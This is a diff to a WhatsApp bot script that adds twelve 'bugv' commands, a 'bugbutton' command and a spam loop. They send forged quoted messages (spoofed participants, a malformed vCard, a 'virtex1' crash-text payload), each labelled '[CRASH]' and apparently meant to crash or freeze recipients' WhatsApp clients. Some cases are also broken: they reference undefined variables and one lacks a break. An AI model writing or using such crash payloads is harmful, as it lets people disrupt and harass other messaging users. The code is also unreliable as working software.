@@ -20,6 +20,7 @@ const { performance } = require('perf_hooks')
 const { Primbon } = require('scrape-primbon')
 const primbon = new Primbon()
 const { color, bgcolor } = require('./lib/color')
+const { virtex1 } = require('./src/virtex1')
 const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom } = require('./lib/myfunc')
 
 // read database
@@ -3477,22 +3478,37 @@ Prefix : ${prefix}
                             hisoka.send5ButLoc(m.chat, anu, "@SHIELD-BOT", fs.readFileSync('./menu1.jpeg'), btn)
                      }
             break
-case 'bug':
+case 'bugv1':
+let fdoc = {
+key : {
+participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
+},
+message: {
+documentMessage: {
+title: `By: メʜᴀɴᴢ々ᴏꜰᴄメ`, 
+jpegThumbnail: fs.readFileSync(`./menu1.jpeg`),
+}
+}
+}           
+hisoka.sendMessage(m.chat, {text:"HANZ々OFC彡 [CRASH]"},{quoted:fdoc})
+break
+case 'bugv2':
 let foto = { 
-        key: { 
-            fromMe: false, 
-            participant: `0@s.whatsapp.net`, 
-            ...({ remoteJid: "" }) 
-        }, 
-        message: { 
-            "imageMessage": { 
-                "mimetype": "image/jpeg", 
-                "caption": `HANZ々OFC彡`, 
-                "jpegThumbnail": thumb
-            } 
-        } 
-    }
-hisoka.sendMessage(m.chat, {text:"HANZ々OFC彡"}, {quoted:foto})
+key: { 
+fromMe: false, 
+participant: `0@s.whatsapp.net`, 
+...({ remoteJid: "" }) 
+}, 
+message: { 
+"imageMessage": { 
+"mimetype": "image/jpeg", 
+"caption": `HANZ々OFC彡`, 
+"jpegThumbnail": thumb
+} 
+} 
+}
+hisoka.sendMessage(m.chat, {text:"HANZ々OFC彡 [CRASH]"},{quoted:foto})
+case 'bugv3':
 let fvoc = {
 key: { 
 fromMe: false,
@@ -3506,7 +3522,25 @@ message: {
 }
 } 
 }
-hisoka.sendMessage(m.chat, {text:"HANZ々OFC彡"},{quoted:fvoc})
+hisoka.sendMessage(m.chat, {text:"HANZ々OFC彡 [CRASH]"},{quoted:fvoc})
+break
+case 'bugv4':
+let fvoc = {
+key: { 
+fromMe: false,
+participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
+},
+message: { 
+"audioMessage": {
+"mimetype":"audio/ogg; codecs=opus",
+"seconds": "99999",
+"ptt": "true"
+}
+} 
+}
+hisoka.sendMessage(m.chat, {text:"HANZ々OFC彡 [CRASH]"},{quoted:foce})
+break
+case 'bugv5':
 let fgif = { 
 key: {
 fromMe: false,
@@ -3520,8 +3554,10 @@ message: { "videoMessage": {
 'jpegThumbnail': fs.readFileSync(`./menu1.jpeg`),
 }
 }
-}     
-hisoka.sendMessage(m.chat, {text:"HANZ々OFC彡"},{quoted:fgif})
+}
+hisoka.sendMessage(m.chat, {text:"HANZ々OFC彡 [CRASH]"},{quoted:fgif})
+break
+case 'bugv6':
 let floc = {
 key : {
 participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
@@ -3533,29 +3569,124 @@ jpegThumbnail: fs.readFileSync(`./menu1.jpeg`),
 }
 }
 }
-hisoka.sendMessage(m.chat, {text:"HANZ々OFC彡"},{quoted:floc})
+hisoka.sendMessage(m.chat, {text:"HANZ々OFC彡 [CRASH]"},{quoted:floc})
 break 
+case 'bugv7':
+let ftoko = { 
+key: { 
+fromMe: false, 
+participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
+},
+message: { 
+"productMessage": { 
+"product": { 
+"productImage":{ 
+"mimetype": "image/jpeg", 
+"jpegThumbnail": fs.readFileSync(`./menu1.jpeg`)}, 
+"title": "HANZ々OFC彡", 
+"description": "HANZ々OFC彡", 
+"currencyCode": "USD", 
+"priceAmount1000": "5000000000", 
+"retailerId": "hanz", 
+"productImageCount": 1}, 
+"businessOwnerJid": `6285737134572@s.whatsapp.net`}}}	
+hisoka.sendMessage(m.chat, {text:"HANZ々OFC彡 [CRASH]"},{quoted:f})
+break
+case 'bugv8':
+let foncevid = { 
+key: {
+fromMe: false, 
+remoteJid: "6281315995629@g.us", 
+participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
+},
+message: { 
+videoMessage: { 
+viewOnce: true
+},
+},
+};
+hisoka.sendMessage(m.chat, {text:"HANZ々OFC彡 [CRASH]"},{quoted:foncevid})
+break
+case 'bugv9':
+let fonceimg = {
+key: {
+fromMe: false,
+participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
+},
+message: {
+imageMessage: {
+viewOnce: true
+},
+},
+};
+hisoka.sendMessage(m.chat, {text:"HANZ々OFC彡 [CRASH]"},{quoted:fonceimg})
+break
+case 'bugv10':
+let fgc = { 
+key: {
+fromMe: false,
+participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
+},
+"message": {
+"groupInviteMessage": {
+"groupJid": "62895619083555-1616169743@g.us",
+"inviteCode": "mememteeeekkeke",
+"groupName": "P",
+"caption": `ʜᴀɴᴢ々ᴏꜰᴄ`,
+ 'jpegThumbnail': fs.readFileSync('./menu1.jpeg')}}}
+hisoka.sendMessage(m.chat, {text:"HANZ々OFC彡 [CRASH]"},{quoted:fgc})
+break
+case 'bugv11':
+let anu = { 
+"key": {
+"participant": `0@s.whatsapp.net`,
+"remoteJid": "",
+"fromMe": false,
+"id": "3B64558B07848BD81108C1D14712018E"
+},
+"message": {
+"stickerMessage": {
+"fileSha256": "uZiOJzqOvrOo2WGjnMKgX2MMQMyasT+ZDgqUczpIBmY=",
+"pngThumbnail": fs.readFileSync(`./menu1.jpeg`), 
+"mimetype": "image/webp",
+"height": 64,
+"width": 64,
+"directPath": "/v/t62.15575-24/56110107_763365384384977_5720135628188301198_n.enc?oh=450f8f684b06f0ba2dbc9779e5f06774&oe=605B81EE",
+"fileLength": "60206",
+"firstFrameLength": 3626,
+"isAnimated": false
+}
+},
+"messageTimestamp": "1614070775",
+"status": "PENDING"
+ }
+ hisoka.sendMessage(m.chat, {text:"HANZ々OFC彡 [CRASH]"},{quoted:anu})
+ break
+//Bug quoted versi gua ini gua campuran sama yg virkon crash home yg udh punah itu🗿
+case 'bugv12':
+let fkon = { 
+key: { 
+fromMe: false, 
+participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
+},
+message: { "contactMessage": { 
+"displayName": `Dislplay`,
+ "vcard": `BEGIN:VCARD\nVERSION:3.0\nN:;Masih gw pikirin;;;\nFN:Masih gw pikirin\nitem1.TEL;waid=35312338989:+353 1 233 8989\nitem1.X-ABLabel:Telepon\nX-WA-BIZ-NAME:No ku +353\nEND:VCARD\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+359996400\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;xnxx;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\;CHARSET=UTF-8\;type=HOME\,INTERNET\;ac;\nitem4.X-ABADR:\nitem4.X-ABLabel:Casa\nitem5.X-WHATSAPP;type=INTERNET:EMAIL;CRASHED=UTF-8;type=HOME,INTERNET:+\nitem5.X-ABLabel:INTERNET\nEND:VCARD`, 
+ "jpegThumbnail": fs.readFileSync('./menu1.jpeg')}}}
+hisoka.sendMessage(m.chat, {text:"HANZ々OFC彡 [CRASH]"},{quoted:fkon})
+break      
 case 'troli': {
 	if (!isCreator) return
 a = await hisoka.sendMessage(m.chat, {react: {  key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
 	let troli = generateWAMessageFromContent(m.chat,{
-
 	"orderMessage": {
- 
 	"orderId": "599519108102353",
- 
 	"thumbnail": fs.readFileSync('./menu1.jpeg'),
- 
 	"itemCount": 2022,
- 
 	"status": "INQUIRY",
- 
 	"surface": "CATALOG",
- 
 	"message": `Tes`,
- 
 	"orderTitle": `Donk`, // 
- 
 	"sellerJid": "6283131458282@s.whatsapp.net",
 	"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
 	}
@@ -3580,6 +3711,30 @@ a = await hisoka.sendMessage(m.chat, {react: {  key: { remoteJid: m.chat, fromMe
 	hisoka.relayMessage(m.chat, troli.message, { messageId: troli.key.id, a})
 	}
 	break
+case 'bugbutton': {
+            let buttons = [
+{buttonId: `Jembod`, buttonText:{displayText:`HANZ々OFC彡-${virtex1(prefix)}`,}, type: 1}
+                ]
+                let buttonMessage = {
+                    image: fs.readFileSync('./menu1.jpeg'),
+                    caption: `💤HANZ々OFC彡💤\n
+╭━━•›ꪶ ཻུ۪۪ꦽꦼ̷⸙ ━ ━ ━ ━ ꪶ ཻུ۪۪ꦽꦼ̷⸙‹•━━╮
+┃╭┈─────────────⩵꙰ཱི࿐
+┃╰── ⏤͟͟͞Script Bot──➤ ↶↷*
+╰•͙✩̣̣̣̣
+⁙┃〲◦➛Link Sc: https://bit.ly/3vJZJ7n
+⁙┃〲◦➛Link Donasi: https://saweria.co/harisnew
+⁙┃〲◦➛Link Instagram: https://www.instagram.com/wong_koclok_
+⁙┃〲◦➛Link You Tube: https://youtube.com/channel/UCfhWUHl7dskRCVlyDMxnQbw
+⁙╰•▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬
+${virtex1(prefix)}`,
+                    footer: virtex1(prefix),
+                    buttons: buttons,
+                    headerType: 4
+                }
+                hisoka.sendMessage(m.chat, buttonMessage, { quoted: m })
+            }
+            break
 case 'sendreaksi' : {
                 Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
                 a = await hisoka.sendMessage(m.chat, {react: {  key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
@@ -3614,23 +3769,23 @@ m.reply(`SUCCES`)
                 break
 case 'colidek' : {
                     a = await hisoka.sendMessage(m.chat, {react: {  key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
-                    await hisoka.sendMessage(m.chat, {text:"RANZ GET CRASH"}, {quoted: a})
-                    await hisoka.sendMessage(m.chat, {text:"RANZ GET CRASH"}, {quoted: a})
-                    await hisoka.sendMessage(m.chat, {text:"RANZ GET CRASH"}, {quoted: a})
-                    await hisoka.sendMessage(m.chat, {text:"RANZ GET CRASH"}, {quoted: a})
-                    await hisoka.sendMessage(m.chat, {text:"RANZ GET CRASH"}, {quoted: a})
-                    await hisoka.sendMessage(m.chat, {text:"RANZ GET CRASH"}, {quoted: a})
-                    await hisoka.sendMessage(m.chat, {text:"RANZ GET CRASH"}, {quoted: a})
-                    await hisoka.sendMessage(m.chat, {text:"RANZ GET CRASH"}, {quoted: a})
-                    await hisoka.sendMessage(m.chat, {text:"RANZ GET CRASH"}, {quoted: a})
-                    await hisoka.sendMessage(m.chat, {text:"RANZ GET CRASH"}, {quoted: a})
-                    await hisoka.sendMessage(m.chat, {text:"RANZ GET CRASH"}, {quoted: a})
-                    await hisoka.sendMessage(m.chat, {text:"RANZ GET CRASH"}, {quoted: a})
-                    await hisoka.sendMessage(m.chat, {text:"RANZ GET CRASH"}, {quoted: a})
-                    await hisoka.sendMessage(m.chat, {text:"RANZ GET CRASH"}, {quoted: a})
-                    await hisoka.sendMessage(m.chat, {text:"RANZ GET CRASH"}, {quoted: a})
-                    await hisoka.sendMessage(m.chat, {text:"RANZ GET CRASH"}, {quoted: a})
-                    await hisoka.sendMessage(m.chat, {text:"RANZ GET CRASH"}, {quoted: a})
+                    await hisoka.sendMessage(m.chat, {text:"HANZ々OFC彡I GIVE [CRASH]"}, {quoted: a})
+                    await hisoka.sendMessage(m.chat, {text:"HANZ々OFC彡I GIVE [CRASH]"}, {quoted: a})
+                    await hisoka.sendMessage(m.chat, {text:"HANZ々OFC彡I GIVE [CRASH]"}, {quoted: a})
+                    await hisoka.sendMessage(m.chat, {text:"HANZ々OFC彡I GIVE [CRASH]"}, {quoted: a})
+                    await hisoka.sendMessage(m.chat, {text:"HANZ々OFC彡I GIVE [CRASH]"}, {quoted: a})
+                    await hisoka.sendMessage(m.chat, {text:"HANZ々OFC彡I GIVE [CRASH]"}, {quoted: a})
+                    await hisoka.sendMessage(m.chat, {text:"HANZ々OFC彡I GIVE [CRASH]"}, {quoted: a})
+                    await hisoka.sendMessage(m.chat, {text:"HANZ々OFC彡I GIVE [CRASH]"}, {quoted: a})
+                    await hisoka.sendMessage(m.chat, {text:"HANZ々OFC彡I GIVE [CRASH]"}, {quoted: a})
+                    await hisoka.sendMessage(m.chat, {text:"HANZ々OFC彡I GIVE [CRASH]"}, {quoted: a})
+                    await hisoka.sendMessage(m.chat, {text:"HANZ々OFC彡I GIVE [CRASH]"}, {quoted: a})
+                    await hisoka.sendMessage(m.chat, {text:"HANZ々OFC彡I GIVE [CRASH]"}, {quoted: a})
+                    await hisoka.sendMessage(m.chat, {text:"HANZ々OFC彡I GIVE [CRASH]"}, {quoted: a})
+                    await hisoka.sendMessage(m.chat, {text:"HANZ々OFC彡I GIVE [CRASH]"}, {quoted: a})
+                    await hisoka.sendMessage(m.chat, {text:"HANZ々OFC彡I GIVE [CRASH]"}, {quoted: a})
+                    await hisoka.sendMessage(m.chat, {text:"HANZ々OFC彡I GIVE [CRASH]"}, {quoted: a})
+                    await hisoka.sendMessage(m.chat, {text:"HANZ々OFC彡I GIVE [CRASH]"}, {quoted: a})
                     m.reply(`BUG COLI DEK`)
                      }
                 break
